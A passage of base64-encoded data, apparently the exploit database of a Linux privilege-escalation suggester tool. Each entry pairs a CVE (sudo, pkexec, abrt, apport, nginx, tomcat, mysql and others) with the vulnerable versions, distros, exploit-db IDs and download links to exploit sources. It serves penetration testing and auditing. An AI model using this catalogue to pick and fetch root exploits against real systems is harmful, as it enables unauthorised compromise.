0eHRncm59W0NWRS0yMDA0LTAxODZdJHt0eHRyc3R9IHNhbWJhClJlcXM6IHBrZz1zYW1iYSx2ZXI8PTIuMi44ClRhZ3M6IApSYW5rOiAxCmV4cGxvaXQtZGI6IDIzNjc0CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDA5LTExODVdJHt0eHRyc3R9IHVkZXYKUmVxczogcGtnPXVkZXYsdmVyPDE0MSxjbWQ6W1sgLWYgL2V0Yy91ZGV2L3J1bGVzLmQvOTUtdWRldi1sYXRlLnJ1bGVzIHx8IC1mIC9saWIvdWRldi9ydWxlcy5kLzk1LXVkZXYtbGF0ZS5ydWxlcyBdXQpUYWdzOiB1YnVudHU9OC4xMHw5LjA0ClJhbms6IDEKZXhwbG9pdC1kYjogODU3MgpDb21tZW50czogVmVyc2lvbjwxLjQuMSB2dWxuZXJhYmxlIGJ1dCBkaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkIApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAwOS0xMTg1XSR7dHh0cnN0fSB1ZGV2IDIKUmVxczogcGtnPXVkZXYsdmVyPDE0MQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDg0NzgKQ29tbWVudHM6IFNTSCBhY2Nlc3MgdG8gbm9uIHByaXZpbGVnZWQgdXNlciBpcyBuZWVkZWQuIFZlcnNpb248MS40LjEgdnVsbmVyYWJsZSBidXQgZGlzdHJvcyB1c2Ugb3duIHZlcnNpb25pbmcgc2NoZW1lLiBNYW51YWwgdmVyaWZpY2F0aW9uIG5lZWRlZApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0wODMyXSR7dHh0cnN0fSBQQU0gTU9URApSZXFzOiBwa2c9bGlicGFtLW1vZHVsZXMsdmVyPD0xLjEuMQpUYWdzOiB1YnVudHU9OS4xMHwxMC4wNApSYW5rOiAxCmV4cGxvaXQtZGI6IDE0MzM5CkNvbW1lbnRzOiBTU0ggYWNjZXNzIHRvIG5vbiBwcml2aWxlZ2VkIHVzZXIgaXMgbmVlZGVkCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTQxNzBdJHt0eHRyc3R9IFN5c3RlbVRhcApSZXFzOiBwa2c9c3lzdGVtdGFwLHZlcjw9MS4zClRhZ3M6IFJIRUw9NXtzeXN0ZW10YXA6MS4xLTMuZWw1fSxmZWRvcmE9MTN7c3lzdGVtdGFwOjEuMi0xLmZjMTN9ClJhbms6IDEKYXV0aG9yOiBUYXZpcyBPcm1hbmR5CmV4cGxvaXQtZGI6IDE1NjIwCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDExLTE0ODVdJHt0eHRyc3R9IHBrZXhlYwpSZXFzOiBwa2c9cG9sa2l0LHZlcj0wLjk2ClRhZ3M6IFJIRUw9Nix1YnVudHU9MTAuMDR8MTAuMTAKUmFuazogMQpleHBsb2l0LWRiOiAxNzk0MgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMS0yOTIxXSR7dHh0cnN0fSBrdHN1c3MKUmVxczogcGtnPWt0c3Vzcyx2ZXI8PTEuNApUYWdzOiBzcGFya3k9NXw2ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTEvMDgvMTMvMgpzcmMtdXJsOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmNvbGVzL2xvY2FsLWV4cGxvaXRzL21hc3Rlci9DVkUtMjAxMS0yOTIxL2t0c3Vzcy1scGUuc2gKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTItMDgwOV0ke3R4dHJzdH0gZGVhdGhfc3RhciAoc3VkbykKUmVxczogcGtnPXN1ZG8sdmVyPj0xLjguMCx2ZXI8PTEuOC4zClRhZ3M6IGZlZG9yYT0xNiAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMi9KYW4vYXR0LTU5MC9hZHZpc29yeV9zdWRvLnR4dApleHBsb2l0LWRiOiAxODQzNgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNC0wNDc2XSR7dHh0cnN0fSBjaGtyb290a2l0ClJlcXM6IHBrZz1jaGtyb290a2l0LHZlcjwwLjUwClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3NlY2xpc3RzLm9yZy9vc3Mtc2VjLzIwMTQvcTIvNDMwCmV4cGxvaXQtZGI6IDMzODk5CkNvbW1lbnRzOiBSb290aW5nIGRlcGVuZHMgb24gdGhlIGNyb250YWIgKHVwIHRvIG9uZSBkYXkgb2YgZGVsYXkpCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTUxMTldJHt0eHRyc3R9IF9fZ2NvbnZfdHJhbnNsaXRfZmluZApSZXFzOiBwa2c9Z2xpYmN8bGliYzYseDg2ClRhZ3M6IGRlYmlhbj02ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vZ29vZ2xlcHJvamVjdHplcm8uYmxvZ3Nwb3QuY29tLzIwMTQvMDgvdGhlLXBvaXNvbmVkLW51bC1ieXRlLTIwMTQtZWRpdGlvbi5odG1sCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzM0NDIxLnRhci5negpleHBsb2l0LWRiOiAzNDQyMQpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS0xODYyXSR7dHh0cnN0fSBuZXdwaWQgKGFicnQpClJlcXM6IHBrZz1hYnJ0LGNtZDpncmVwIC1xaSBhYnJ0IC9wcm9jL3N5cy9rZXJuZWwvY29yZV9wYXR0ZXJuClRhZ3M6IGZlZG9yYT0yMApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL29wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNS8wNC8xNC80CnNyYy11cmw6IGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vdGF2aXNvLzBmMDJjMjU1YzEzYzVjMTEzNDA2L3Jhdy9lYWZhYzc4ZGNlNTEzMjliMDNiZWE3MTY3ZjEyNzE3MThiZWU0ZGNjL25ld3BpZC5jCmV4cGxvaXQtZGI6IDM2NzQ2CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTMzMTVdJHt0eHRyc3R9IHJhY2VhYnJ0ClJlcXM6IHBrZz1hYnJ0LGNtZDpncmVwIC1xaSBhYnJ0IC9wcm9jL3N5cy9rZXJuZWwvY29yZV9wYXR0ZXJuClRhZ3M6IGZlZG9yYT0xOXthYnJ0OjIuMS41LTEuZmMxOX0sZmVkb3JhPTIwe2FicnQ6Mi4yLjItMi5mYzIwfSxmZWRvcmE9MjF7YWJydDoyLjMuMC0zLmZjMjF9LFJIRUw9N3thYnJ0OjIuMS4xMS0xMi5lbDd9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vc2VjbGlzdHMub3JnL29zcy1zZWMvMjAxNS9xMi8xMzAKc3JjLXVybDogaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS90YXZpc28vZmUzNTkwMDY4MzZkNmNkMTA5MWUvcmF3LzMyZmU4NDgxYzQzNGY4Y2FkNWJjZjg1Mjk3ODkyMzE2MjdlNTA3NGMvcmFjZWFicnQuYwpleHBsb2l0LWRiOiAzNjc0NwphdXRob3I6IFRhdmlzIE9ybWFuZHkKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMTMxOF0ke3R4dHJzdH0gbmV3cGlkIChhcHBvcnQpClJlcXM6IHBrZz1hcHBvcnQsdmVyPj0yLjEzLHZlcjw9Mi4xNyxjbWQ6Z3JlcCAtcWkgYXBwb3J0IC9wcm9jL3N5cy9rZXJuZWwvY29yZV9wYXR0ZXJuClRhZ3M6IHVidW50dT0xNC4wNApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL29wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNS8wNC8xNC80CnNyYy11cmw6IGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vdGF2aXNvLzBmMDJjMjU1YzEzYzVjMTEzNDA2L3Jhdy9lYWZhYzc4ZGNlNTEzMjliMDNiZWE3MTY3ZjEyNzE3MThiZWU0ZGNjL25ld3BpZC5jCmV4cGxvaXQtZGI6IDM2NzQ2CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTEzMThdJHt0eHRyc3R9IG5ld3BpZCAoYXBwb3J0KSAyClJlcXM6IHBrZz1hcHBvcnQsdmVyPj0yLjEzLHZlcjw9Mi4xNyxjbWQ6Z3JlcCAtcWkgYXBwb3J0IC9wcm9jL3N5cy9rZXJuZWwvY29yZV9wYXR0ZXJuClRhZ3M6IHVidW50dT0xNC4wNC4yClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vb3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE1LzA0LzE0LzQKZXhwbG9pdC1kYjogMzY3ODIKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMzIwMl0ke3R4dHJzdH0gZnVzZSAoZnVzZXJtb3VudCkKUmVxczogcGtnPWZ1c2UsdmVyPDIuOS4zClRhZ3M6IGRlYmlhbj03LjB8OC4wLHVidW50dT0qClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vc2VjbGlzdHMub3JnL29zcy1zZWMvMjAxNS9xMi81MjAKZXhwbG9pdC1kYjogMzcwODkKQ29tbWVudHM6IE5lZWRzIGNyb24gb3Igc3lzdGVtIGFkbWluIGludGVyYWN0aW9uCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTE4MTVdJHt0eHRyc3R9IHNldHJvdWJsZXNob290ClJlcXM6IHBrZz1zZXRyb3VibGVzaG9vdCx2ZXI8My4yLjIyClRhZ3M6IGZlZG9yYT0yMQpSYW5rOiAxCmV4cGxvaXQtZGI6IDM2NTY0CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTMyNDZdJHt0eHRyc3R9IHVzZXJoZWxwZXIKUmVxczogcGtnPWxpYnVzZXIsdmVyPD0wLjYwClRhZ3M6IFJIRUw9NntsaWJ1c2VyOjAuNTYuMTMtKDR8NSkuZWw2fSxSSEVMPTZ7bGlidXNlcjowLjYwLTUuZWw3fSxmZWRvcmE9MTN8MTl8MjB8MjF8MjIKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vd3d3LnF1YWx5cy5jb20vMjAxNS8wNy8yMy9jdmUtMjAxNS0zMjQ1LWN2ZS0yMDE1LTMyNDYvY3ZlLTIwMTUtMzI0NS1jdmUtMjAxNS0zMjQ2LnR4dCAKZXhwbG9pdC1kYjogMzc3MDYKQ29tbWVudHM6IFJIRUwgNSBpcyBhbHNvIHZ1bG5lcmFibGUsIGJ1dCBpbnN0YWxsZWQgdmVyc2lvbiBvZiBnbGliYyAoMi41KSBsYWNrcyBmdW5jdGlvbnMgbmVlZGVkIGJ5IHJvb3RoZWxwZXIuYwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS01Mjg3XSR7dHh0cnN0fSBhYnJ0L3Nvc3JlcG9ydC1yaGVsNwpSZXFzOiBwa2c9YWJydCxjbWQ6Z3JlcCAtcWkgYWJydCAvcHJvYy9zeXMva2VybmVsL2NvcmVfcGF0dGVybgpUYWdzOiBSSEVMPTd7YWJydDoyLjEuMTEtMTIuZWw3fQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cub3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE1LzEyLzAxLzEKc3JjLXVybDogaHR0cHM6Ly93d3cub3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDE1LzEyLzAxLzEvMQpleHBsb2l0LWRiOiAzODgzMgphdXRob3I6IHJlYmVsCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTY1NjVdJHt0eHRyc3R9IG5vdF9hbl9zc2hudWtlClJlcXM6IHBrZz1vcGVuc3NoLXNlcnZlcix2ZXI+PTYuOCx2ZXI8PTYuOQpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTcvMDEvMjYvMgpleHBsb2l0LWRiOiA0MTE3MwphdXRob3I6IEZlZGVyaWNvIEJlbnRvCkNvbW1lbnRzOiBOZWVkcyBhZG1pbiBpbnRlcmFjdGlvbiAocm9vdCB1c2VyIG5lZWRzIHRvIGxvZ2luIHZpYSBzc2ggdG8gdHJpZ2dlciBleHBsb2l0YXRpb24pCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTg2MTJdJHt0eHRyc3R9IGJsdWVtYW4gc2V0X2RoY3BfaGFuZGxlciBkLWJ1cyBwcml2ZXNjClJlcXM6IHBrZz1ibHVlbWFuLHZlcjwyLjAuMwpUYWdzOiBkZWJpYW49OHtibHVlbWFuOjEuMjN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3R3aXR0ZXIuY29tL3RoZWdydWdxL3N0YXR1cy82Nzc4MDk1Mjc4ODI4MTM0NDAKZXhwbG9pdC1kYjogNDYxODYKYXV0aG9yOiBTZWJhc3RpYW4gS3JhaG1lcgpDb21tZW50czogRGlzdHJvcyB1c2Ugb3duIHZlcnNpb25pbmcgc2NoZW1lLiBNYW51YWwgdmVyaWZpY2F0aW9uIG5lZWRlZC4KRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtMTI0MF0ke3R4dHJzdH0gdG9tY2F0LXJvb3Rwcml2ZXNjLWRlYi5zaApSZXFzOiBwa2c9dG9tY2F0ClRhZ3M6IGRlYmlhbj04LHVidW50dT0xNi4wNApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvVG9tY2F0LURlYlBrZ3MtUm9vdC1Qcml2aWxlZ2UtRXNjYWxhdGlvbi1FeHBsb2l0LUNWRS0yMDE2LTEyNDAuaHRtbApzcmMtdXJsOiBodHRwOi8vbGVnYWxoYWNrZXJzLmNvbS9leHBsb2l0cy90b21jYXQtcm9vdHByaXZlc2MtZGViLnNoCmV4cGxvaXQtZGI6IDQwNDUwCmF1dGhvcjogRGF3aWQgR29sdW5za2kKQ29tbWVudHM6IEFmZmVjdHMgb25seSBEZWJpYW4tYmFzZWQgZGlzdHJvcwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi0xMjQ3XSR7dHh0cnN0fSBuZ2lueGVkLXJvb3Quc2gKUmVxczogcGtnPW5naW54fG5naW54LWZ1bGwsdmVyPDEuMTAuMwpUYWdzOiBkZWJpYW49OCx1YnVudHU9MTQuMDR8MTYuMDR8MTYuMTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL05naW54LUV4cGxvaXQtRGViLVJvb3QtUHJpdkVzYy1DVkUtMjAxNi0xMjQ3Lmh0bWwKc3JjLXVybDogaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2V4cGxvaXRzL0NWRS0yMDE2LTEyNDcvbmdpbnhlZC1yb290LnNoCmV4cGxvaXQtZGI6IDQwNzY4CmF1dGhvcjogRGF3aWQgR29sdW5za2kKQ29tbWVudHM6IFJvb3RpbmcgZGVwZW5kcyBvbiBjcm9uLmRhaWx5ICh1cCB0byAyNGggb2YgZGVsYXkpLiBBZmZlY3RlZDogZGViODogPDEuNi4yOyAxNC4wNDogPDEuNC42OyAxNi4wNDogMS4xMC4wOyBnZW50b286IDwxLjEwLjItcjMKRU9GCikKCkVYUExPSVRTX1VTRVJTUEFDRVsoKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTYtMTUzMV0ke3R4dHJzdH0gcGVybF9zdGFydHVwIChleGltKQpSZXFzOiBwa2c9ZXhpbSx2ZXI8NC44Ni4yClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5leGltLm9yZy9zdGF0aWMvZG9jL0NWRS0yMDE2LTE1MzEudHh0CmV4cGxvaXQtZGI6IDM5NTQ5CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTE1MzFdJHt0eHRyc3R9IHBlcmxfc3RhcnR1cCAoZXhpbSkgMgpSZXFzOiBwa2c9ZXhpbSx2ZXI8NC44Ni4yClRhZ3M6IApSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5leGltLm9yZy9zdGF0aWMvZG9jL0NWRS0yMDE2LTE1MzEudHh0CmV4cGxvaXQtZGI6IDM5NTM1CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTQ5ODldJHt0eHRyc3R9IHNldHJvdWJsZXNob290IDIKUmVxczogcGtnPXNldHJvdWJsZXNob290ClRhZ3M6IFJIRUw9Nnw3ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2Mtc2tpbGxzLmJsb2dzcG90LmNvbS8yMDE2LzA2L2xldHMtZmVlZC1hdHRhY2tlci1pbnB1dC10by1zaC1jLXRvLXNlZS5odG1sCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9zdGVhbHRoL3Ryb3VibGVzaG9vdGVyL3Jhdy9tYXN0ZXIvc3RyYWlnaHQtc2hvb3Rlci5jCmV4cGxvaXQtZGI6CkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTU0MjVdJHt0eHRyc3R9IHRvbWNhdC1SSC1yb290LnNoClJlcXM6IHBrZz10b21jYXQKVGFnczogUkhFTD03ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1RvbWNhdC1SZWRIYXQtUGtncy1Sb290LVByaXZFc2MtRXhwbG9pdC1DVkUtMjAxNi01NDI1Lmh0bWwKc3JjLXVybDogaHR0cDovL2xlZ2FsaGFja2Vycy5jb20vZXhwbG9pdHMvdG9tY2F0LVJILXJvb3Quc2gKZXhwbG9pdC1kYjogNDA0ODgKYXV0aG9yOiBEYXdpZCBHb2x1bnNraQpDb21tZW50czogQWZmZWN0cyBvbmx5IFJlZEhhdC1iYXNlZCBkaXN0cm9zCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTY2NjMsQ1ZFLTIwMTYtNjY2NHxDVkUtMjAxNi02NjYyXSR7dHh0cnN0fSBteXNxbC1leHBsb2l0LWNoYWluClJlcXM6IHBrZz1teXNxbC1zZXJ2ZXJ8bWFyaWFkYi1zZXJ2ZXIsdmVyPDUuNS41MgpUYWdzOiB1YnVudHU9MTYuMDQuMQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtTWFyaWEtUGVyY29uYS1Qcml2RXNjUmFjZS1DVkUtMjAxNi02NjYzLTU2MTYtRXhwbG9pdC5odG1sCnNyYy11cmw6IGh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tL2V4cGxvaXRzL0NWRS0yMDE2LTY2NjMvbXlzcWwtcHJpdmVzYy1yYWNlLmMKZXhwbG9pdC1kYjogNDA2NzgKYXV0aG9yOiBEYXdpZCBHb2x1bnNraQpDb21tZW50czogQWxzbyBNYXJpYURCIHZlcjwxMC4xLjE4IGFuZCB2ZXI8MTAuMC4yOCBhZmZlY3RlZApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi05NTY2XSR7dHh0cnN0fSBuYWdpb3Mtcm9vdC1wcml2ZXNjClJlcXM6IHBrZz1uYWdpb3MsdmVyPDQuMi40ClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9OYWdpb3MtRXhwbG9pdC1Sb290LVByaXZFc2MtQ1ZFLTIwMTYtOTU2Ni5odG1sCnNyYy11cmw6IGh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9leHBsb2l0cy9DVkUtMjAxNi05NTY2L25hZ2lvcy1yb290LXByaXZlc2Muc2gKZXhwbG9pdC1kYjogNDA5MjEKYXV0aG9yOiBEYXdpZCBHb2x1bnNraQpDb21tZW50czogQWxsb3dzIHByaXYgZXNjYWxhdGlvbiBmcm9tIG5hZ2lvcyB1c2VyIG9yIG5hZ2lvcyBncm91cApFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0wMzU4XSR7dHh0cnN0fSBudGZzLTNnLW1vZHByb2JlClJlcXM6IHBrZz1udGZzLTNnLHZlcjwyMDE3LjQKVGFnczogdWJ1bnR1PTE2LjA0e250ZnMtM2c6MjAxNS4zLjE0QVIuMS0xYnVpbGQxfSxkZWJpYW49Ny4we250ZnMtM2c6MjAxMi4xLjE1QVIuNS0yLjErZGViN3UyfSxkZWJpYW49OC4we250ZnMtM2c6MjAxNC4yLjE1QVIuMi0xK2RlYjh1Mn0KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8vYnVncy5jaHJvbWl1bS5vcmcvcC9wcm9qZWN0LXplcm8vaXNzdWVzL2RldGFpbD9pZD0xMDcyCnNyYy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS1iaW4tc3Bsb2l0cy9yYXcvbWFzdGVyL2Jpbi1zcGxvaXRzLzQxMzU2LnppcApleHBsb2l0LWRiOiA0MTM1NgphdXRob3I6IEphbm4gSG9ybgpDb21tZW50czogRGlzdHJvcyB1c2Ugb3duIHZlcnNpb25pbmcgc2NoZW1lLiBNYW51YWwgdmVyaWZpY2F0aW9uIG5lZWRlZC4gTGludXggaGVhZGVycyBtdXN0IGJlIGluc3RhbGxlZC4gU3lzdGVtIG11c3QgaGF2ZSBhdCBsZWFzdCB0d28gQ1BVIGNvcmVzLgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy01ODk5XSR7dHh0cnN0fSBzLW5haWwtcHJpdmdldApSZXFzOiBwa2c9cy1uYWlsLHZlcjwxNC44LjE2ClRhZ3M6IHVidW50dT0xNi4wNCxtYW5qYXJvPTE2LjEwClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTcvMDEvMjcvNwpzcmMtdXJsOiBodHRwczovL3d3dy5vcGVud2FsbC5jb20vbGlzdHMvb3NzLXNlY3VyaXR5LzIwMTcvMDEvMjcvNy8xCmV4dC11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iY29sZXMvbG9jYWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE3LTU4OTkvZXhwbG9pdC5zaAphdXRob3I6IHdhcGlmbGFwaSAob3JnaW5hbCBleHBsb2l0IGF1dGhvcik7IEJyZW5kYW4gQ29sZXMgKGF1dGhvciBvZiBleHBsb2l0IHVwZGF0ZSBhdCAnZXh0LXVybCcpCkNvbW1lbnRzOiBEaXN0cm9zIHVzZSBvd24gdmVyc2lvbmluZyBzY2hlbWUuIE1hbnVhbCB2ZXJpZmljYXRpb24gbmVlZGVkLgpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xMDAwMzY3XSR7dHh0cnN0fSBTdWRvZXItdG8tcm9vdApSZXFzOiBwa2c9c3Vkbyx2ZXI8PTEuOC4yMCxjbWQ6WyAtZiAvdXNyL3NiaW4vZ2V0ZW5mb3JjZSBdClRhZ3M6IFJIRUw9N3tzdWRvOjEuOC42cDd9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL3d3dy5zdWRvLndzL2FsZXJ0cy9saW51eF90dHkuaHRtbApzcmMtdXJsOiBodHRwczovL3d3dy5xdWFseXMuY29tLzIwMTcvMDUvMzAvY3ZlLTIwMTctMTAwMDM2Ny9saW51eF9zdWRvX2N2ZS0yMDE3LTEwMDAzNjcuYwpleHBsb2l0LWRiOiA0MjE4MwphdXRob3I6IFF1YWx5cwpDb21tZW50czogTmVlZHMgdG8gYmUgc3Vkb2VyLiBXb3JrcyBvbmx5IG9uIFNFTGludXggZW5hYmxlZCBzeXN0ZW1zCkVPRgopCgpFWFBMT0lUU19VU0VSU1BBQ0VbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE3LTEwMDAzNjddJHt0eHRyc3R9IHN1ZG9wd24KUmVxczogcGtnPXN1ZG8sdmVyPD0xLjguMjAsY21kOlsgLWYgL3Vzci9zYmluL2dldGVuZm9yY2UgXQpUYWdzOgpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly93d3cuc3Vkby53cy9hbGVydHMvbGludXhfdHR5Lmh0bWwKc3JjLXVybDogaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2MwZDN6M3IwL3N1ZG8tQ1ZFLTIwMTctMTAwMDM2Ny9tYXN0ZXIvc3Vkb3B3bi5jCmV4cGxvaXQtZGI6CmF1dGhvcjogYzBkM3ozcjAKQ29tbWVudHM6IE5lZWRzIHRvIGJlIHN1ZG9lci4gV29ya3Mgb25seSBvbiBTRUxpbnV4IGVuYWJsZWQgc3lzdGVtcwpFT0YKKQoKRVhQTE9JVFNfVVNFUlNQQUNFWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNy0xMDAwMzY2LENWRS0yMDE3LTEwMDAzNzBdJHt0eHRyc3R9IGxpbnV4X2xkc29faHdjYXAKUmVxczogcGtnPWdsaWJjfGxpYmM2LHZlcjw9Mi4yNSx4ODYKVGFnczoKUmFuazogMQphbmFseXNpc